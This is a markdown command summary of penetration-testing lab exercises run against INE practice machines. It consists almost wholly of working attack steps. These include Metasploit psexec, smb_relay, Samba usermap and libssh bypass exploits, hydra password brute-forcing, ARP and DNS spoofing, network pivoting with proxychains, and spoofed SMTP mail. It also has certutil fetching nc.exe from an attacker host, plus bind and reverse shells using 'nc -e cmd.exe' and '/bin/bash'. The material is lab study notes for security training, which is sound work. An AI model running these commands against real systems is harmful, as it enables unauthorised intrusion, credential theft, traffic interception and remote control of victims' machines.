# Penetration Testing Labs — Command & Tool Summary

Reference extracted from `cut_lab2.pdf`. Targets are INE lab machines (e.g. `demo.ine.local`); IPs vary per session.

---

## 1. NetBIOS Hacking
**Tools:** ping, nmap, smbclient, hydra, Metasploit (psexec, socks_proxy), proxychains, meterpreter

```bash
ping -c 5 demo.ine.local
ping -c 5 demo1.ine.local
nmap demo.ine.local
nmap -sV -p 139,445 demo.ine.local
nmap -p445 --script smb-protocols demo.ine.local
nmap -p445 --script smb-security-mode demo.ine.local
smbclient -L demo.ine.local
nmap -p445 --script smb-enum-users.nse demo.ine.local
hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb

# Metasploit - gain shell
msfconsole -q
use exploit/windows/smb/psexec
set RHOSTS demo.ine.local
set SMBUser administrator
set SMBPass password1
exploit

# Post-exploitation
getuid
sysinfo
cat C:\Users\Administrator\Documents\FLAG1.txt
shell
ping 10.0.28.125

# Pivoting / routing
run autoroute -s 10.0.28.125/20
cat /etc/proxychains4.conf
background
use auxiliary/server/socks_proxy
show options
set SRVPORT 9050
set VERSION 4a
exploit
jobs
proxychains nmap demo1.ine.local -sT -Pn -sV -p 445

# Access pivot shares
sessions -i 1
shell
net view 10.0.28.125
migrate -N explorer.exe
net use D: \\10.0.28.125\Documents
net use K: \\10.0.28.125\K$
dir D:
dir K:
cat D:\Confidential.txt
cat D:\FLAG2.txt
```

---

## 2. SNMP Analysis
**Tools:** ping, nmap, snmpwalk, hydra, Metasploit (psexec)

```bash
ping -c 5 demo.ine.local
nmap demo.ine.local
nmap -sU -p 161 demo.ine.local
nmap -sU -p 161 --script=snmp-brute demo.ine.local
snmpwalk -v 1 -c public demo.ine.local
nmap -sU -p 161 --script snmp-* demo.ine.local > snmp_output
ls
hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb

msfconsole -q
use exploit/windows/smb/psexec
show options
set RHOSTS demo.ine.local
set SMBUSER administrator
set SMBPASS elizabeth
exploit
shell
cd C:\
dir
type FLAG1.txt
```

---

## 3. DNS & SMB Relay Attack
**Tools:** Metasploit (smb_relay), dnsspoof, arpspoof

```bash
msfconsole
use exploit/windows/smb/smb_relay
set SRVHOST 172.16.5.101
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 172.16.5.101
set SMBHOST 172.16.5.10
exploit

# DNS spoof
echo "172.16.5.101 *.sportsfoo.com" > dns
dnsspoof -i eth1 -f dns

# ARP spoof / MiTM (two terminals)
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth1 -t 172.16.5.5 172.16.5.1
arpspoof -i eth1 -t 172.16.5.1 172.16.5.5

# Interact
sessions
sessions -i 1
getuid
```

---

## 4. T1046 — Network Service Scanning
**Tools:** ping, nmap, curl, Metasploit (xoda_file_upload, portscan/tcp), bash, static nmap binary

```bash
ping -c 4 demo1.ine.local
nmap demo1.ine.local
curl demo1.ine.local

# Exploit XODA
msfconsole
use exploit/unix/webapp/xoda_file_upload
set RHOSTS demo1.ine.local
set TARGETURI /
set LHOST 192.63.4.2
exploit

# Find second target & route
shell
ip addr
run autoroute -s 192.180.108.2

# Port scan pivot host
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.180.108.3
set verbose false
set ports 1-1000
exploit

# Static binaries / custom scanner
ls -al /root/static-binaries/nmap
file /root/static-binaries/nmap
```

Bash port scanner (`bash-port-scanner.sh`):
```bash
#!/bin/bash
for port in {1..1000}; do
  timeout 1 bash -c "echo >/dev/tcp/$1/$port" 2>/dev/null && echo "port $port is open"
done
```

```bash
# Upload & run on target
sessions -i 1
upload /root/static-binaries/nmap /tmp/nmap
upload /root/bash-port-scanner.sh /tmp/bash-port-scanner.sh
shell
cd /tmp/
chmod +x ./nmap ./bash-port-scanner.sh
./bash-port-scanner.sh 192.180.108.3
./nmap -p- 192.180.108.3
```

---

## 5. Apache Enumeration
**Tools:** ping, Metasploit HTTP auxiliary modules, wget

```bash
ping -c 5 victim-1
msfconsole -q

# Module 1
use auxiliary/scanner/http/http_version
set RHOSTS victim-1
run

# Module 2
use auxiliary/scanner/http/robots_txt
set RHOSTS victim-1
run

# Module 3 (also with TARGETURI /secure)
use auxiliary/scanner/http/http_header
set RHOSTS victim-1
set TARGETURI /secure
run

# Module 4
use auxiliary/scanner/http/brute_dirs
set RHOSTS victim-1
run

# Module 5
use auxiliary/scanner/http/dir_scanner
set RHOSTS victim-1
set DICTIONARY /usr/share/metasploit-framework/data/wordlists/directory.txt
run

# Module 6
use auxiliary/scanner/http/dir_listing
set RHOSTS victim-1
set PATH /data
run

# Module 7
use auxiliary/scanner/http/files_dir
set RHOSTS victim-1
set VERBOSE false
run

# Module 8 - PUT / DELETE
use auxiliary/scanner/http/http_put
set RHOSTS victim-1
set PATH /data
set FILENAME test.txt
set FILEDATA "Welcome To AttackDefense"
run
wget http://victim-1:80/data/test.txt
cat test.txt
set ACTION DELETE
run

# Module 9
use auxiliary/scanner/http/http_login
set RHOSTS victim-1
set AUTH_URI /secure/
set VERBOSE false
run

# Module 10
use auxiliary/scanner/http/apache_userdir_enum
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set RHOSTS victim-1
set VERBOSE false
run
```

---

## 6. Postfix Recon: Basics
**Tools:** nmap, netcat, telnet, smtp-user-enum, Metasploit (smtp_enum), sendemail

```bash
nmap -sV -script banner demo.ine.local
nc demo.ine.local 25
VRFY admin@openmailbox.xyz
VRFY commander@openmailbox.xyz

telnet demo.ine.local 25
HELO attacker.xyz
EHLO attacker.xyz

smtp-user-enum -U /usr/share/commix/src/txt/usernames.txt -t demo.ine.local

msfconsole -q
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS demo.ine.local
exploit

# Fake mail via telnet
telnet demo.ine.local 25
HELO attacker.xyz
mail from: admin@attacker.xyz
rcpt to:root@openmailbox.xyz
data
Subject: Hi Root
...
.

# Fake mail via sendemail
sendemail -f admin@attacker.xyz -t root@openmailbox.xyz -s demo.ine.local -u Fakemail -m "Hi root, a fake from admin" -o tls=no
```

---

## 7. Vulnerable SSH Server
**Tools:** ping, nmap, Metasploit (libssh_auth_bypass)

```bash
ping -c 4 demo.ine.local
nmap -sS -sV demo.ine.local

msfconsole -q
use auxiliary/scanner/ssh/libssh_auth_bypass
set RHOSTS demo.ine.local
set SPAWN_PTY true
exploit
sessions -i 1
```

---

## 8. Banner Grabbing
**Tools:** ifconfig, nmap, netcat

```bash
ifconfig
nmap -sV -O 192.8.94.3
nmap -sV --script=banner 192.8.94.3
nc 192.8.94.3 22
```

---

## 9. Vulnerability Scanning with Nmap Scripts
**Tools:** ifconfig, nmap

```bash
ifconfig
nmap -sV -O 192.152.25.3
nmap -sV -p 80 --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" 192.152.25.3
ls -al /usr/share/nmap/scripts | grep vuln
```

---

## 10. Fixing Exploits
**Tools:** ping, nmap, searchsploit, vim, python SimpleHTTPServer, netcat

```bash
ping -c4 demo.ine.local
nmap -sV demo.ine.local
searchsploit HTTP File Server 2.3
searchsploit -m 39161
vim 39161.py
ifconfig
cp /usr/share/windows-resources/binaries/nc.exe /root/Desktop/
python -m SimpleHTTPServer 80
nc -nvlp 1234
python 39161.py demo.ine.local 80
```

---

## 11. Bind Shells
**Tools:** python, ifconfig, certutil, netcat

```bash
# Host nc.exe (Kali)
cd /usr/share/windows-binaries
python -m SimpleHTTPServer 80
ifconfig

# Download on Windows target
certutil -urlcache -f http://10.10.31.2/nc.exe nc.exe

# Bind shell on Windows, connect from Kali
nc.exe -nvlp 1234 -e cmd.exe          # Windows listener
nc -nv 10.0.23.27 1234                # Kali client

# Reverse direction
nc -nvlp 1234 -e /bin/bash            # Kali listener
nc.exe -nv 10.10.31.2 1234            # Windows client
```

---

## 12. Netcat Fundamentals
**Tools:** ping, netcat, python, ifconfig, certutil

```bash
ping -c 4 demo.ine.local
nc -help

# Connect to ports
nc 10.0.27.35 80
nc -nv 10.0.27.35 80
nc -nv 10.0.27.35 21
nc -nvu 10.0.27.35 161

# Transfer nc.exe to Windows
cd /usr/share/windows-binaries
python -m SimpleHTTPServer 80
ifconfig
certutil -urlcache -f http://10.10.31.2/nc.exe nc.exe

# Listener / chat
nc -nvlp 1234                          # Kali listener
nc -nv 10.10.31.2 1234                 # Windows client

# File transfer
echo "Hello, this was sent over with Netcat" >> test.txt
nc.exe -nvlp 1234 > test.txt           # receiver (Windows)
nc -nv 10.0.27.35 1234 < test.txt      # sender (Kali)
```

---

## 13. Reverse Shells
**Tools:** netcat, python, ifconfig, certutil

```bash
cd /usr/share/windows-binaries
ls
python -m SimpleHTTPServer 80
ifconfig

# On Windows target
certutil -urlcache -f http://<Kali_IP>/nc.exe nc.exe
dir

# Reverse shell
nc -nvlp 1234                              # Kali listener
./nc.exe -nv <Kali_IP> 1234 -e cmd.exe     # Windows connects back
whoami
```

---

## 14. Targeting vsFTPd
**Tools:** ping, nmap, ftp, searchsploit, Metasploit (vsftpd_234_backdoor), hydra

```bash
ping -c 4 demo.ine.local
nmap -sV -sC -p 21 demo.ine.local
ftp demo.ine.local 21                  # login: anonymous / anonymous

searchsploit vsftpd
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS demo.ine.local
run                                     # (patched - fails)

# Brute force instead
hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local ftp
ftp demo.ine.local 21                  # login: service / service
```

---

## 15. Targeting SAMBA
**Tools:** ping, nmap, Metasploit (smb_version, usermap_script), searchsploit

```bash
ping -c 4 demo.ine.local
nmap -sV -p 445 demo.ine.local

# Identify version
msfconsole
use auxiliary/scanner/smb/smb_version
set RHOSTS demo.ine.local
run                                     # Samba 3.0.20

searchsploit samba 3.0.20

# Exploit
use exploit/multi/samba/usermap_script
set RHOSTS demo.ine.local
exploit
whoami
```

---

## Tools Index (all labs)

| Tool | Used in |
|---|---|
| ping | most labs (reachability) |
| nmap | 1, 2, 4, 6, 7, 8, 9, 10, 14, 15 |
| Metasploit (msfconsole) | 1, 2, 3, 4, 5, 6, 7, 14, 15 |
| hydra | 1, 2, 14 |
| smbclient | 1 |
| snmpwalk | 2 |
| proxychains | 1 |
| dnsspoof / arpspoof | 3 |
| curl / wget | 4, 5 |
| netcat (nc / nc.exe) | 6, 8, 10, 11, 12, 13 |
| telnet | 6 |
| smtp-user-enum / sendemail | 6 |
| searchsploit | 10, 14, 15 |
| ftp | 14 |
| certutil | 11, 12, 13 |
| python SimpleHTTPServer | 10, 11, 12, 13 |
| ifconfig | 8, 9, 10, 11, 12, 13 |
| vim | 10 |
